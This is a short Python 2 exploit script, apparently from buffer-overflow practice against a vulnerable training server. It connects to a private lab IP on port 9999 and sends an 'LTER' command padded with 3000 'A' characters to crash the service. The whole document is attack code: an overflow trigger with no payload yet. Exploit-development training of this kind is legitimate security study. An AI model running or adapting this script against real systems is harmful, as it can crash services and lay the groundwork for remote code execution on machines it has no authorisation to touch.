#!/usr/bin/python

import os
import sys
import socket

host = "192.168.122.61"
port = 9999

buffer = "A"*3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("LTER /.:/" + buffer)
print s.recv(1024)
s.close()

